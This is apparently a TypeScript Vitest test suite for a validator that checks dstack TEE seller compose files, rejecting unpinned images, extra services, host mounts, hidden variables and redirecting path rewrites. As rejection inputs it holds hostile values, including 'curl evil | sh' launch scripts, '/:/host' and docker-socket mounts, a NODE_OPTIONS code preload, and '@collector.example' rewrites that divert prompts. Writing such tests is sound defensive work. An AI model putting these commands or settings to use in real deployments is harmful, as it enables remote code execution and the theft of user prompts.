import { describe, it, expect } from 'vitest'
import { checkAppCompose } from './dstack-app-compose.js'
import { TEST_IMAGE, appCompose, composeHash, referenceCompose, sellerConfig, withSellerConfig } from './dstack-build.fixture.js'

type Obj = Record<string, any>

function checkApp(app: string) {
  return checkAppCompose(app, composeHash(app), [TEST_IMAGE])
}
function checkCompose(compose: Obj, over: Obj = {}) {
  return checkApp(appCompose(compose, over))
}
/** The reference compose with its one service changed. */
function withService(change: (service: Obj) => void): Obj {
  const compose = referenceCompose()
  change(compose['services']['seller'])
  return compose
}
/** The reference compose with other providers, each reading the reference's OPENAI_API_KEY unless it names its own. */
function withProviders(providers: Obj): Obj {
  const compose = referenceCompose()
  const config = sellerConfig(compose)
  config['seller']['providers'] = Object.fromEntries(Object.entries(providers).map(([name, cfg]) => [name, { apiKeyEnv: 'OPENAI_API_KEY', ...cfg }]))
  return withSellerConfig(compose, config)
}

describe('checkAppCompose', () => {
  it('accepts the reference compose and reports its image and upstream', () => {
    expect(checkCompose(referenceCompose())).toEqual({
      image: TEST_IMAGE,
      upstreams: [{ provider: 'inference', plugin: 'openai', origin: 'https://upstream.example' }],
    })
  })

  it('rejects a document that is not the measured one', () => {
    const app = appCompose(referenceCompose())
    expect(checkAppCompose(app, composeHash(app + ' '), [TEST_IMAGE])).toEqual({ error: 'app compose does not match the measured compose hash' })
  })

  it('rejects an image that is not an approved Antseed image', () => {
    expect(checkAppCompose(appCompose(referenceCompose()), composeHash(appCompose(referenceCompose())), [])).toMatchObject({ error: expect.stringMatching(/not an approved Antseed TEE seller image/) })
    expect(checkCompose(withService((s) => { s['image'] = 'ghcr.io/antseed/tee-seller:latest' }))).toMatchObject({ error: 'service image must be pinned by digest' })
  })

  it('accepts the approved digest from any registry (the digest names the content)', () => {
    expect(checkCompose(withService((s) => { s['image'] = `mirror.example/tee-seller@${TEST_IMAGE.digest}` }))).not.toHaveProperty('error')
  })

  it('rejects app-level settings that run code outside the image, and allows public logs', () => {
    expect(checkCompose(referenceCompose(), { pre_launch_script: 'curl evil | sh' })).toMatchObject({ error: expect.stringMatching(/pre-launch/) })
    // The image runs the seller in content-free mode, so its logs hold no prompts.
    expect(checkCompose(referenceCompose(), { public_logs: true })).not.toHaveProperty('error')
    // Phala Cloud sets it; it only stops the CVM from booting without the matching launch token.
    expect(checkCompose(referenceCompose(), { launch_token_hash: 'ab'.repeat(32) })).not.toHaveProperty('error')
    expect(checkCompose(referenceCompose(), { init_script: ['curl evil | sh'] })).toMatchObject({ error: expect.stringMatching(/init_script is not allowed/) })
    expect(checkCompose(referenceCompose(), { runner: 'bash', bash_script: 'x' })).toMatchObject({ error: expect.stringMatching(/bash_script is not allowed/) })
    expect(checkCompose(referenceCompose(), { runner: 'bash' })).toMatchObject({ error: expect.stringMatching(/docker compose/) })
  })

  it('only accepts encrypted variables that the compose uses as secrets', () => {
    expect(checkCompose(referenceCompose(), { allowed_envs: ['ANTSEED_IDENTITY_HEX', 'COMPOSE_FILE'] })).toMatchObject({ error: expect.stringMatching(/encrypted variables/) })
  })

  it('rejects a compose file in YAML (the buyer reads JSON only)', () => {
    const app = JSON.stringify({ ...JSON.parse(appCompose(referenceCompose())), docker_compose_file: 'services:\n  seller: {}\n' })
    expect(checkApp(app)).toEqual({ error: 'compose file (write it as JSON) is not JSON' })
  })

  it('rejects a second service, and service options that change what runs', () => {
    const two = referenceCompose()
    two['services']['sidecar'] = { image: `x@${TEST_IMAGE.digest}` }
    expect(checkCompose(two)).toMatchObject({ error: 'compose file must have exactly one service' })
    for (const [key, value] of [['command', ['seller', 'start', '--verbose']], ['entrypoint', ['sh']], ['user', 'root'], ['privileged', true], ['env_file', ['.env']], ['network_mode', 'host']] as const) {
      expect(checkCompose(withService((s) => { s[key] = value }))).toMatchObject({ error: `service option ${key} is not allowed` })
    }
    expect(checkCompose({ ...referenceCompose(), secrets: {} })).toMatchObject({ error: expect.stringMatching(/top-level/) })
  })

  it('hides only secrets that cannot redirect prompts', () => {
    const env = (e: Obj) => checkCompose(withService((s) => { s['environment'] = { ...s['environment'], ...e } }))
    expect(env({ ANTSEED_BASE_RPC_URL: '${ANTSEED_BASE_RPC_URL}' })).not.toHaveProperty('error')
    expect(env({ ANTSEED_BASE_RPC_URL: 'https://mainnet.base.org' })).not.toHaveProperty('error')
    expect(env({ ANTSEED_VERIFIER_PROVIDER_EVIDENCE_URL: 'https://provider.example/attest?nonce={nonce}' })).not.toHaveProperty('error')
    expect(env({ OPENAI_BASE_URL: '${OPENAI_BASE_URL}' })).toMatchObject({ error: expect.stringMatching(/OPENAI_BASE_URL may not come from a hidden variable/) })
    expect(env({ HTTPS_PROXY: '${HTTPS_PROXY}' })).toMatchObject({ error: expect.stringMatching(/hidden variable/) })
    expect(env({ OPENAI_API_KEY: '${OTHER_API_KEY}' })).toMatchObject({ error: expect.stringMatching(/hidden variable/) })
    expect(env({ HTTPS_PROXY: 'http://proxy.example:8080' })).toMatchObject({ error: 'environment HTTPS_PROXY is not allowed' })
    expect(env({ NODE_OPTIONS: '--require /x.js' })).toMatchObject({ error: expect.stringMatching(/NODE_OPTIONS is not allowed/) })
    expect(env({ OPENAI_BASE_URL: 'https://upstream.example' })).toMatchObject({ error: expect.stringMatching(/OPENAI_BASE_URL is not allowed/) })
    expect(env({ OTHER_API_KEY: '${OTHER_API_KEY}' })).toMatchObject({ error: expect.stringMatching(/OTHER_API_KEY is hidden but is not an API key the seller config names/) })
    const reserved = withProviders({ o: { plugin: 'openai', apiKeyEnv: 'POSTHOG_PROJECT_API_KEY', services: {} } })
    delete reserved['services']['seller']['environment']['OPENAI_API_KEY']
    reserved['services']['seller']['environment']['POSTHOG_PROJECT_API_KEY'] = '${POSTHOG_PROJECT_API_KEY}'
    expect(checkCompose(reserved, { allowed_envs: ['POSTHOG_PROJECT_API_KEY'] })).toMatchObject({ error: expect.stringMatching(/POSTHOG_PROJECT_API_KEY is hidden but is not an API key/) })
    expect(env({ ANTSEED_TEE_PEER_ID: 'x${HIDDEN}' })).toMatchObject({ error: expect.stringMatching(/may not reference variables/) })
    expect(env({ OPENAI_API_KEY: '${OPENAI_API_KEY:-default}' })).toMatchObject({ error: expect.stringMatching(/OPENAI_API_KEY is not allowed/) })
  })

  it('rejects variables anywhere outside the environment, including the inline seller config', () => {
    const compose = referenceCompose()
    compose['configs']['seller-config']['content'] = compose['configs']['seller-config']['content'].replace('https://upstream.example', '${UPSTREAM}')
    expect(checkCompose(compose)).toMatchObject({ error: expect.stringMatching(/outside the environment/) })
    expect(checkCompose(withService((s) => { s['ports'] = ['${PORT}:6882'] }))).toMatchObject({ error: expect.stringMatching(/outside the environment/) })
  })

  it('only mounts the data volume and the dstack socket', () => {
    for (const v of ['/:/host', '/etc:/etc/antseed', 'seller-data:/home/nonroot/.antseed/plugins', '/var/run/docker.sock:/var/run/dstack.sock', 'seller-data:/var/lib/antseed:ro']) {
      expect(checkCompose(withService((s) => { s['volumes'] = [v] }))).toMatchObject({ error: expect.stringMatching(/volume/) })
    }
    const driver = referenceCompose()
    driver['volumes']['seller-data'] = { driver_opts: { type: 'none', o: 'bind', device: '/' } }
    expect(checkCompose(driver)).toMatchObject({ error: 'volumes must be plain named volumes' })
  })

  it('requires the seller config inline at the path the image reads', () => {
    expect(checkCompose(withService((s) => { s['configs'] = [{ source: 'seller-config', target: '/tmp/config.json' }] }))).toMatchObject({ error: expect.stringMatching(/mounted at/) })
    const file = referenceCompose()
    file['configs']['seller-config'] = { file: './config.json' }
    expect(checkCompose(file)).toMatchObject({ error: 'the seller config must be inline content' })
  })

  it('lists every upstream, defaults included, and requires https', () => {
    expect(checkCompose(withProviders({
      a: { plugin: '@antseed/provider-anthropic', services: {} },
      o: { plugin: 'openai', services: {}, fallbackUpstreams: [{ baseUrl: 'https://backup.example/api' }] },
    }))).toMatchObject({
      upstreams: [
        { provider: 'a', plugin: 'anthropic', origin: 'https://api.anthropic.com' },
        { provider: 'o', plugin: 'openai', origin: 'https://api.openai.com' },
        { provider: 'o', plugin: 'openai', origin: 'https://backup.example' },
      ],
    })
    expect(checkCompose(withProviders({ o: { plugin: 'openai', baseUrl: 'http://upstream.example', services: {} } }))).toMatchObject({ error: expect.stringMatching(/https URL/) })
    expect(checkCompose(withProviders({ o: { plugin: 'openai', baseUrl: 'https://user:pw@upstream.example', services: {} } }))).toMatchObject({ error: expect.stringMatching(/without credentials/) })
    expect(checkCompose(withProviders({ a: { plugin: 'anthropic', baseUrl: 'https://elsewhere.example', services: {} } }))).toMatchObject({ error: expect.stringMatching(/baseUrl its plugin ignores/) })
    expect(checkCompose(withProviders({ l: { plugin: 'local-llm', services: {} } }))).toMatchObject({ error: expect.stringMatching(/cannot use/) })
    expect(checkCompose(withProviders({ v: { plugin: 'venice-video', services: {}, fallbackUpstreams: [] } }))).toMatchObject({ error: expect.stringMatching(/fallbackUpstreams are not supported/) })
    // fal-video uploads buyer media to a storage host named at runtime, which no config shows.
    expect(checkCompose(withProviders({ v: { plugin: 'fal-video', baseUrl: 'https://queue.example', services: {} } }))).toMatchObject({ error: expect.stringMatching(/cannot use/) })
  })

  it('accepts only seller settings that cannot load code or change roles', () => {
    const withConfig = (change: (config: Obj) => void) => {
      const compose = referenceCompose()
      const config = sellerConfig(compose)
      change(config)
      return checkCompose(withSellerConfig(compose, config))
    }
    // seller.agentDir imports agent tool modules from disk, which the measurement doesn't cover.
    expect(withConfig((c) => { c['seller']['agentDir'] = '/var/lib/antseed/agent' })).toMatchObject({ error: 'seller.agentDir is not allowed in a TEE seller config' })
    expect(withConfig((c) => { c['seller']['agentDir'] = { 'service-id': '/var/lib/antseed/agent' } })).toMatchObject({ error: 'seller.agentDir is not allowed in a TEE seller config' })
    expect(withConfig((c) => { c['plugins'] = [{ name: 'x', package: 'x', installedAt: '' }] })).toMatchObject({ error: 'plugins is not allowed in a TEE seller config' })
    expect(withConfig((c) => { c['buyer'] = {} })).toMatchObject({ error: 'buyer is not allowed in a TEE seller config' })
    expect(withConfig((c) => { c['seller']['providers']['inference']['injectJson'] = {} })).toMatchObject({ error: 'provider inference injectJson is not allowed in a TEE seller config' })
    expect(withConfig((c) => { c['seller']['maxConcurrentBuyers'] = 50; c['seller']['buyerLimits'] = {}; c['network'] = { bootstrapNodes: [] } })).not.toHaveProperty('error')
  })

  it('accepts path rewrites only when they stay on the reported upstream', () => {
    const rewrite = (to: string, fallback = false) => checkCompose(withProviders({
      o: fallback
        ? { plugin: 'openai', services: {}, fallbackUpstreams: [{ baseUrl: 'https://backup.example/api', pathRewrite: { '/v1/chat/completions': to } }] }
        : { plugin: 'openai', baseUrl: 'https://upstream.example', services: {}, pathRewrite: { '/v1/chat/completions': to } },
    }))
    expect(rewrite('/v4/chat/completions')).not.toHaveProperty('error')
    expect(rewrite('/v4/chat/completions', true)).not.toHaveProperty('error')
    for (const fallback of [false, true]) {
      // The relay appends the rewrite to the base URL: "https://upstream.example" + "@collector.example/v1" is collector.example.
      expect(rewrite('@collector.example/v1/chat/completions', fallback)).toMatchObject({ error: expect.stringMatching(/must be a path starting with one "\/"/) })
      expect(rewrite('//collector.example/v1', fallback)).toMatchObject({ error: expect.stringMatching(/must be a path/) })
      expect(rewrite('.collector.example/v1', fallback)).toMatchObject({ error: expect.stringMatching(/must be a path/) })
    }
    // A fallback inherits the provider's rewrites, which must stay on the fallback's host too.
    expect(checkCompose(withProviders({
      o: { plugin: 'openai', services: {}, pathRewrite: { '/v1/chat/completions': ':8443/v1' }, fallbackUpstreams: [{ baseUrl: 'https://backup.example' }] },
    }))).toMatchObject({ error: expect.stringMatching(/pathRewrite/) })
  })
})
